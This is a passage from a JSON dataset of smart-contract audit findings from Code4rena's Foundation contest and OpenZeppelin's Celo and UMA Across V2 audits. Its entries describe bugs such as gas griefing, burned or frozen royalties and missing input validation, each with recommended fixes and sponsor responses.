      "summary": "\nThis bug report is about a vulnerability in the code of the MarketFees.sol contract, which is part of the 2022-08-foundation repository on GitHub. The vulnerability can cause real royalties parties to not receive their revenue from sales. The root cause of the issue is that when the nftContract does not have any support for royalties info, and the overrideContract fetched from royaltyRegistry.getRoyaltyLookupAddress(nftContract) implements both getRoyalties and royaltyInfo but does not support royaltyInfo by returning (address(this), 0), the 3rd priority of the getFees() function fails to check if royaltyAmount is greater than 0. This can cause the function _distributeFunds() to transfer the creator revenue to the market contract, which would freeze the funds in the contract forever. The recommended mitigation step is to add a check to the 3rd priority to see if royaltyAmount is greater than 0.",
      "quality_score": 2,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "https://github.com/code-423n4/2022-08-foundation-findings/issues/147",
      "tags": [
        "Royalty",
        "ERC2981"
      ],
      "finders": [
        "bin2chen  Lambda",
        "KIntern_NA"
      ]
    },
    {
      "id": "3165",
      "title": "[M-02] NFT creator sales revenue recipients can steal gas",
      "impact": "MEDIUM",
      "content": "_Submitted by berndartmueller, also found by 0xHarry, peritoflores, and shenwilly_\n\nSelling a NFT with `NFTDropMarketFixedPriceSale.mintFromFixedPriceSale` distributes the revenue from the sale to various recipients with the `MarketFees._distributeFunds` function.\n\nRecipients:\n\n*   NFT creator(s)\n*   NFT seller\n*   Protocol\n*   Buy referrer (optional)\n\nIt is possible to have multiple NFT creators. Sale revenue will be distributed to each NFT creator address. Revenue distribution is done by calling `SendValueWithFallbackWithdraw._sendValueWithFallbackWithdraw` and providing an appropriate gas limit to prevent consuming too much gas. For the revenue distribution to the seller, protocol and the buy referrer, a gas limit of `SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT = 20_000` is used. However, for the creators, a limit of `SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS = 210_000` is used. This higher amount of gas is used if `PercentSplitETH` is used as a recipient.\n\nA maximum of `MAX_ROYALTY_RECIPIENTS = 5` NFT creator recipients are allowed.\n\nFor example, a once honest NFT collection and its 5 royalty creator recipients could turn \"malicious\" and could \"steal\" gas from NFT buyers on each NFT sale and therefore grief NFT sales. On each NFT sell, the 5 creator recipients (smart contracts) could consume the full amount of `SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS = 210_000` forwarded gas. Totalling `5 * 210_000 = 1_050_000` gas. With a gas price of e.g. `20 gwei`, this equals to additional gas costs of `21_000_000 gwei = 0.028156 eth`, with a `ETH` price of `2000`, this would total to \\~`56.31 $` additional costs.\n\n### Proof of Concept\n\n[mixins/shared/MarketFees.sol#L130](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L130)\n\n```solidity\n/**\n  * @notice Distributes funds to foundation, creator recipients, and NFT owner after a sale.\n  */\nfunction _distributeFunds(\n  address nftContract,\n  uint256 tokenId,\n  address payable seller,\n  uint256 price,\n  address payable buyReferrer\n)\n  internal\n  returns (\n    uint256 totalFees,\n    uint256 creatorRev,\n    uint256 sellerRev\n  )\n{\n  address payable[] memory creatorRecipients;\n  uint256[] memory creatorShares;\n\n  uint256 buyReferrerFee;\n  (totalFees, creatorRecipients, creatorShares, sellerRev, buyReferrerFee) = _getFees(\n    nftContract,\n    tokenId,\n    seller,\n    price,\n    buyReferrer\n  );\n\n  // Pay the creator(s)\n  unchecked {\n    for (uint256 i = 0; i < creatorRecipients.length; ++i) {\n      _sendValueWithFallbackWithdraw(\n        creatorRecipients[i],\n        creatorShares[i],\n        SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS // @audit-info A higher amount of gas is forwarded to creator recipients\n      );\n      // Sum the total creator rev from shares\n      // creatorShares is in ETH so creatorRev will not overflow here.\n      creatorRev += creatorShares[i];\n    }\n  }\n\n  // Pay the seller\n  _sendValueWithFallbackWithdraw(seller, sellerRev, SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT);\n\n  // Pay the protocol fee\n  _sendValueWithFallbackWithdraw(getFoundationTreasury(), totalFees, SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT);\n\n  // Pay the buy referrer fee\n  if (buyReferrerFee != 0) {\n    _sendValueWithFallbackWithdraw(buyReferrer, buyReferrerFee, SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT);\n    emit BuyReferralPaid(nftContract, tokenId, buyReferrer, buyReferrerFee, 0);\n    unchecked {\n      // Add the referrer fee back into the total fees so that all 3 return fields sum to the total price for events\n      totalFees += buyReferrerFee;\n    }\n  }\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider only providing a higher amount of gas (`SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS`) for the first creator recipient. For all following creator recipients, only forward the reduced amount of gas `SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT`.\n\n**[HardlyDifficult (Foundation) confirmed and commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/165#issuecomment-1220553946):**\n > We will be making changes here.\n> \n> This seems like a Low risk issue since only gas is at risk, but protecting our collectors is an important goal so we are comfortable with Medium here.\n> \n> As the warden has noted, we use gas caps consistently when interacting with external addresses/contracts. This is important to ensure that the cost to collectors does not become unwieldy.. and that the calls cannot revert (e.g. if the receiver gets stuck in a loop).\n> \n> The gas limits we set are high enough to allow some custom logic to be performed, and to support smart contract wallets such as Gnosis Safe. For the scenario highlighted here, we have used a very high limit in order to work with contracts such as PercentSplitETH (which will push payments to up to 5 different recipients, and those recipients may be smart contract wallets themselves).\n> \n> However we were too flexible here. And in total, the max potential gas costs are higher than they should be. We have changed the logic to only use `SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS` when 1 recipient is defined, otherwise use `SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT`. This will support our PercentSplitETH scenario and use cases like it, while restricting the worst case scenario to something much more reasonable.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/165#issuecomment-1228026327):**\n > Keeping the Medium severity because users are potentially paying more than necessary.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the code of a contract that distributes revenue from the sale of a non-fungible token (NFT). The vulnerability allows multiple NFT creators to consume a higher amount of gas (210,000) than the amount used for the seller, protocol, and buy referrer (20,000). This gas is used to distribute revenue to each NFT creator address. If the NFT creators are malicious, they could \"steal\" gas from NFT buyers on each NFT sale and incur additional costs. \n\nThe vulnerability was found in the code of the `_distributeFunds` function in the `MarketFees.sol` contract. The code can be found at the following link: https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L130. \n\nThe recommended mitigation steps for this vulnerability are to only provide a higher amount of gas (`SEND_VALUE_GAS_LIMIT_MULTIPLE_RECIPIENTS`) for the first creator recipient and use a reduced amount of gas (`SEND_VALUE_GAS_LIMIT_SINGLE_RECIPIENT`) for all following creator recipients. \n\nThe bug was found through manual review.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "https://github.com/code-423n4/2022-08-foundation-findings/issues/165",
      "tags": [],
      "finders": [
        "berndartmueller",
        "peritoflores",
        "shenwilly",
        "0xHarry"
      ]
    },
    {
      "id": "3164",
      "title": "[M-01] Creator fees may be burned",
      "impact": "MEDIUM",
      "content": "_Submitted by Lambda_\n\n`royaltyInfo`, `getRoyalties`, or `getFeeRecipients` may return `address(0)` as the recipient address. While the value 0 is correctly handled for the royalties itself, it is not for the address. In such a case, the ETH amount will be sent to `address(0)`, i.e. it is burned and lost.\n\n### Recommended Mitigation Steps\n\nIn your logic for determining the recipients, treat `address(0)` as if no recipient was returned such that the other priorities / methods take over.\n\n\n**[HardlyDifficult (Foundation) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/31#issuecomment-1220570897):**\n > We are looking into options here to improve.\n> \n> We believe this is Medium risk, burning a percent of the sale revenue is a form of leaking value. Otherwise the sale works as expected and the collector does get the NFT they purchased.\n> \n> The royalty APIs we use are meant to specific which addresses should receive payments and how much they each should receive. As the warden noted, we try to ignore entries which specify a 0 amount... but did not filter out address(0) recipients with >0 requested. Originally we were thinking this was a way of requesting that a portion of the sale be burned since that seems to be what the data is proposing.\n> \n> However we agree that this is more likely a configuration error. Since our market uses ETH and not ERC20 tokens, it's unlikely that creators would actually want a portion of the proceeds burned. We are exploring a change to send the additional revenue to the seller instead of burning the funds in this scenario.\n\n**[HickupHH3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/31#issuecomment-1226890842):**\n > Case of protocol leaked value: Medium severity is appropriate.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a website that could cause ETH amounts to be sent to an address of 0, which would result in the ETH being burned and lost. This vulnerability is present in the code located at the given URL. \n\nThe impact of this bug is that the functions `royaltyInfo`, `getRoyalties`, or `getFeeRecipients` may return the address 0 as the recipient address. While the value 0 is correctly handled for the royalties, it is not for the address, resulting in the ETH being sent to address 0 and burned. \n\nThe recommended mitigation steps for this bug are to treat address 0 as if no recipient was returned in the logic for determining the recipients, so that the other priorities or methods take over. This will prevent the ETH from being sent to address 0 and being burned.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "https://github.com/code-423n4/2022-08-foundation-findings/issues/31",
      "tags": [
        "Validation"
      ],
      "finders": [
        "Lambda"
      ]
    },
    {
      "id": "10582",
      "title": "Incorrect version number",
      "impact": "LOW",
      "content": "Pull request[#9252](https://github.com/celo-org/celo-monorepo/pull/9252/files#diff-7ed4b70452014859fd0baa0e2346f7bd804d43f6dc055a71e5bcda62846814d6R299-R302)changes the behavior of the`setSpread`function in`Exchange.sol`, but does not update the version reported by the[`getVersionNumber`](https://github.com/celo-org/celo-monorepo/blob/83b5c21c20fb22d17c46f73bc67b3de88f69e171/packages/protocol/contracts/stability/Exchange.sol#L68)function.\n\n\nConsider incrementing the patch number returned by`getVersionNumber`in order to adhere to the[smart contract release process](https://docs.celo.org/community/release-process/smart-contracts).\n\n\n***Update:**Fixed in[PR #8334](https://github.com/celo-org/celo-monorepo/pull/8334).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit  Release 7  Part 2",
      "source_link": "https://blog.openzeppelin.com/celo-contracts-audit-release-7-part2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10581",
      "title": "Missing oracle can cause unexpected behavior",
      "impact": "LOW",
      "content": "Prior to pull request[#9367](https://github.com/celo-org/celo-monorepo/pull/9367/files), the`addToken`function in the`Reserve`contract checked that an oracle exists for the token being added, and the oracle returns a non-zero exchange rate. These checks ensured that every token in the`_tokens`array had a corresponding oracle.\n\n\nWith the oracle checks removed from`addToken`by this pull request, it is possible to enter a state where the token has been added but the oracle doesnt exist yet. However, the`getReserveRatio`function in the`Reserve`contract assumes that every token has a corresponding oracle that returns non-zero exchange rate values. If no oracle exists for a specific token,[the converted price calculation](https://github.com/celo-org/celo-monorepo/blob/eb9ded122872bb3f2682c282a99dc4349b59aa7d/packages/protocol/contracts/stability/Reserve.sol#L542)will result in a divide-by-zero error.\n\n\nThe following contracts also contain code which can incorrectly divide by zero if queried with an oracle that is returning zero:\n\n\n* [`getGasPriceMinimum`](https://github.com/celo-org/celo-monorepo/blob/eb9ded122872bb3f2682c282a99dc4349b59aa7d/packages/protocol/contracts/common/GasPriceMinimum.sol#L126)of`GasPriceMinimum`\n* [`getTargetTotalEpochPaymentsInGold`](https://github.com/celo-org/celo-monorepo/blob/eb9ded122872bb3f2682c282a99dc4349b59aa7d/packages/protocol/contracts/governance/EpochRewards.sol#L409)of`EpochRewards`\n\n\nConsider implementing additional logic that excludes tokens without oracles from the reserve ratio calculation, as well as including checks to ensure helpful errors are thrown rather than divide-by-zero errors.\n\n\n***Update:**Partially fixed. The`getReserveRatio`function was fixed in[PR #9527](https://github.com/celo-org/celo-monorepo/pull/9527). Both`getGasPriceMinimum`and`getTargetTotalEpochPaymentsInGold`remain unchanged. Celos statement for this issue:*\n\n\n\n> *Updating`getGasPriceMinimum`is not critical, as the only reasonable behavior when there is no oracle report is to revert (could be nicer to fail with a relevant require message, but this is an edge case). Updating`getTargetTotalEpochPaymentsInGold`is not necessary as it only ever converts from cUSD (not other cStables), which already has an oracle rate.*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit  Release 7  Part 2",
      "source_link": "https://blog.openzeppelin.com/celo-contracts-audit-release-7-part2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10616",
      "title": "Time is cast unsafely",
      "impact": "LOW",
      "content": "In the`HubPool`function[`_updateAccumulatedLpFees`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L857), the return value of[`getCurrentTime()`is cast to a`uint32`value](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L860). This means that the value will be truncated to fit within 32 bits, and at some point around Feb 6, 2106, it will roll over and the value returned by casting to`uint32`will drop down to`0`. This will set[`pooledToken.lastLpFeeUpdate`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L860)to a much lower number than the previous`lastLpFeeUpdate`. Any subsequent time`_getAccumulatedFees`is called, the[`timeFromLastInteraction`calculation](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L867)will be exceedingly high, and all undistributed fees will be[accounted for as accumulated](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L858-L859).\n\n\nAgain, note that this issue will only occur starting in the year 2106. Consider changing the size of the cast from`uint32`to a larger number, like`uint64`. This should be more than enough to not encounter limits within a reasonably distant future. Alternatively, consider documenting the behavior and defining a procedure for what to do if the system is still in operation when the`uint32`limit is hit, or for shutting down the system before the year 2106.\n\n\n**Update**:*Fixed in[pull request #95](https://github.com/across-protocol/contracts-v2/pull/95)as of commit[`2f59388906346780e729f2b879b643941ea314c9`](https://github.com/across-protocol/contracts-v2/pull/95/commits/2f59388906346780e729f2b879b643941ea314c9).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UMA Across V2 Audit",
      "source_link": "https://blog.openzeppelin.com/uma-across-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10615",
      "title": "Unexpected proposal cancellation",
      "impact": "LOW",
      "content": "In the[`HubPool`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol)contract during a call to the[`disputeRootBundle`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L589)function, if the`bondAmount`and`finalFee`values are the same, then the proposer bond passed to the optimistic oracle[is zero](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L618).\n\n\nWhen this happens, the optimistic oracle unilaterally[sets the bond to the`finalFee`](https://github.com/UMAprotocol/protocol/blob/5b37ea818a28479c01e458389a83c3e736306b17/packages/core/contracts/oracle/implementation/SkinnyOptimisticOracle.sol#L321)and then attempts to[withdraw`bond + final fee`](https://github.com/UMAprotocol/protocol/blob/5b37ea818a28479c01e458389a83c3e736306b17/packages/core/contracts/oracle/implementation/SkinnyOptimisticOracle.sol#L332).\n\n\nSince the`HubPool`only[sets the allowance for the oracle to`bondAmount`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L607)rather than`bondAmount + finalFee`, this transfer will fail and, as a result,[the proposal will be cancelled](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L631).\n\n\nThis means that in the situation where`bondAmount`and`finalFee`values are identical,*every*proposal will be cancelled. Consider documenting this situation, checking for it explicitly and reverting with an insightful error message. Additionally, consider trying to avoid the situation by reverting in the[`setBond`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L270)function if the`newBondAmount`is equal to the`finalFee`or in the[`proposeRootBundle`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L490)function if`bondAmount`is equal to the`finalFee`.\n\n\n**Update**:*Partially fixed in[pull request #96](https://github.com/across-protocol/contracts-v2/pull/96)as of commit[`671d416db0fe6d813e3761bda0e3132cb30a8e1d`](https://github.com/across-protocol/contracts-v2/pull/96/commits/671d416db0fe6d813e3761bda0e3132cb30a8e1d). The condition is checked in`setBond`but not in`proposeRootBundle`.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UMA Across V2 Audit",
      "source_link": "https://blog.openzeppelin.com/uma-across-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10614",
      "title": "Some functions not markednonReentrant",
      "impact": "LOW",
      "content": "We have not identified any security issues relating to reentrancy. However, out of an abundance of caution, consider marking the following`public`functions in the[`HubPool`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol)contract as`nonReentrant`. Consider that the`nonReentrant`modifier only works if both the original function, and the re-entered function are marked`nonReentrant`.\n\n\n* [`setProtocolFeeCapture`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L254)\n* [`setBond`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L270)\n* [`setLiveness`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L287)\n* [`setIdentifier`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L297)\n* [`whitelistRoute`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L329)\n* [`enableL1TokenForLiquidityProvision`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L350)\n* [`disableL1TokenForLiquidityProvision`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L364)\n* [`addLiquidity`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L384)\n\n\n**Update**:*Fixed. Partially addressed in[pull request #62](https://github.com/across-protocol/contracts-v2/pull/62)as of commit[`a3b5b5600e53d2ae877a4c1c18d78aadb01ff2e6`](https://github.com/across-protocol/contracts-v2/pull/62/commits/a3b5b5600e53d2ae877a4c1c18d78aadb01ff2e6)and then fully addressed in[pull request #92](https://github.com/across-protocol/contracts-v2/pull/92)as of commit[`7aa2fa8f46f8d40512857f35dd3ac64587c61f18`](https://github.com/across-protocol/contracts-v2/pull/92/commits/7aa2fa8f46f8d40512857f35dd3ac64587c61f18).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UMA Across V2 Audit",
      "source_link": "https://blog.openzeppelin.com/uma-across-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10613",
      "title": "Liquidity provisioning can skew fee assessments",
      "impact": "LOW",
      "content": "In the[`HubPool`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol)contract the[`enableL1TokenForLiquidityProvision`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L350)function allows the contract`owner`to enable an`l1token`to be added to the protocol for liquidity pooling.\n\n\nThis is allowed even if the`l1token`is*already*currently enabled.\n\n\nAs this function also[sets the`lastLpFeeUpdate`variable](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L355)to the then-current`block.timestamp`, enabling an already enabled token will skip over the period of time since`lastLpFeeUpdate`was last set. As a result, any LP fees that should have been assessed for that time period would simply never be assessed.\n\n\nConsider reverting if this function is called for an`l1token`that is already enabled.\n\n\n**Update**:*Fixed in[pull request #94](https://github.com/across-protocol/contracts-v2/pull/94)as of commit[`b1a097748a82c3276619a06fa36358b574f843e1`](https://github.com/across-protocol/contracts-v2/pull/94/commits/b1a097748a82c3276619a06fa36358b574f843e1).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UMA Across V2 Audit",
      "source_link": "https://blog.openzeppelin.com/uma-across-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10612",
      "title": "Polygon bridger does not enforcechainIdrequirements",
      "impact": "LOW",
      "content": "The[`PolygonTokenBridger`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/PolygonTokenBridger.sol#L30)contracts primary functions are only intended to be called either on l1*or*l2, but not both. In fact, calling the functions on the wrong chain could result in unexpected behavior and unnecessary confusion.\n\n\nIn the best case, the functions will simply revert if called from the wrong chain because they will attempt to interact with other contracts that do not exist on that chain. For example, calling the[`receive`function](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/PolygonTokenBridger.sol#L81)(by sending the contract some native asset) could trigger reverts on Polygon, but not on Ethereum, because there is a WETH contract at the`l1Weth`address on the latter but not the former.\n\n\nHowever, in the worst case, it is possible that such calls will*not*revert, but result in lost funds instead. For example, if a WETH-like contract was later deployed to the`l1Weth`address on Polygon, then the call would not revert. Instead, tokens would be sent to that contract and could remain stuck there.\n\n\nAlthough the inline documentation details which function should be called on which chain, consider having the functions in this contract actively enforce these requirements via limiting execution to the correct`block.chainid`.\n\n\n**Update**:*Fixed in[pull request #115](https://github.com/across-protocol/contracts-v2/pull/115)as of commit[`b80d7a5396d31662265bb28b61a1a3d09ed76760`](https://github.com/across-protocol/contracts-v2/pull/115/commits/b80d7a5396d31662265bb28b61a1a3d09ed76760)and[pull request #128](https://github.com/across-protocol/contracts-v2/pull/128)as of commit[`811ac20674d28189fd01297c05ce5b9e89f7a183`](https://github.com/across-protocol/contracts-v2/pull/128/commits/811ac20674d28189fd01297c05ce5b9e89f7a183).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UMA Across V2 Audit",
      "source_link": "https://blog.openzeppelin.com/uma-across-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10611",
      "title": "No good way to disable routes in HubPool",
      "impact": "LOW",
      "content": "Within the`SpokePool`there exists the[`enabledDepositRoutes`mapping](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol#L58), which lists routes that have been approved for deposits (allowing a user to deposit in one spoke pool and withdraw the deposit from another). The[`setEnableRoute`function](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol#L212)can be used to enable or disable these routes.\n\n\nWithin the`HubPool`, there is a separate[`whitelistedRoutes`mapping](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L78), which determines[whether tokens can be sent to a certain spoke during rebalances](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L787). The only way to affect the`whitelistedRoutes`mapping is by calling[`whitelistRoute`](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L329-L343), which includes a call to[enable the`originToken`/`destinationChainId`pair](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L338-L341)within the Spoke. This means that there is no good way to disable a whitelisted route in the hub without enabling the same route in the`enabledDepositRoutes`mapping in the SpokePool.\n\n\nAssuming that there may be cases in the future where it would be desirable to disable a certain deposit route, consider adding a function which can disable a`whitelistedRoutes`element (by setting the value in the mapping to`address(0)`) without enabling the route in the SpokePool. It may be desirable to disable both atomically from the HubPool, or to establish a procedure to disable them independently in a specific order. Consider designing a procedure for valid cross-chain token transfers in the case that only one mapping has a certain route marked as disabled, and including this in the UMIP for dispute resolution. Finally, note that any atomic cancellations will still include a delay between when the message is initiated on the hub chain and when execution can be considered finalized on the spoke chain.\n\n\n**Update**:*Fixed in[pull request #89](https://github.com/across-protocol/contracts-v2/pull/89)as of commit[`2d0adf78647070e4dd20690f67f46daaa6fc82c4`](https://github.com/across-protocol/contracts-v2/pull/89/commits/2d0adf78647070e4dd20690f67f46daaa6fc82c4).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UMA Across V2 Audit",
      "source_link": "https://blog.openzeppelin.com/uma-across-v2-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10610",
      "title": "Lack of input validation",
      "impact": "LOW",
      "content": "Throughout the codebase there are functions lacking sufficient input validation. For instance:\n\n\n* In the[`HubPool`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol)contract the various[admin functions](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L229-L367)will accept`0`values for inputs. This could result in the loss of funds and unexpected behaviors if null values are unintentionally provided.\n* In the`HubPool`contract the[`setProtocolFeeCapture`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L254)function does not use the[`noActiveRequests`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/HubPool.sol#L200)modifier. This could allow the protocol fee to be increased even for liquidity providers that have already provided liquidity.\n* In the[`MerkleLib`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/MerkleLib.sol)library the[`isClaimed1D`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/MerkleLib.sol#L88)function does not work as expected if an`index`is greater than 255. In such a case, it will return`true`despite the fact that those values are not actually claimed.\n* In the[`SpokePool`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol)contract the[`deposit`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol#L267)function does not enforce the requirement suggested by the[`deploymentTime`comment](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol#L45)which says that relays cannot have a quote time before`deploymentTime`.\n* In the`SpokePool`contract the[`speedUpDeposit`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol#L329)function does not restrict the[`newRelayerFeePct`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/SpokePool.sol#L331)to be less than 50% like the[regular deposit does](https://github.com/across-protocol/contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/uma-across-contracts-v2/contracts/SpokePool.sol#L276). In practice, the`_fillRelay`function wont accept a fee that is too high, but this should still be enforced within`speedUpDeposit`.\n* In the[`PolygonTokenBridger`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/PolygonTokenBridger.sol)contract the normal use case of[`send`](https://github.com/across-protocol/across-smart-contracts-v2/blob/bf03255cbd1db3045cd2fbf1580f24081f46b43a/contracts/PolygonTokenBridger.sol#L59)involves the 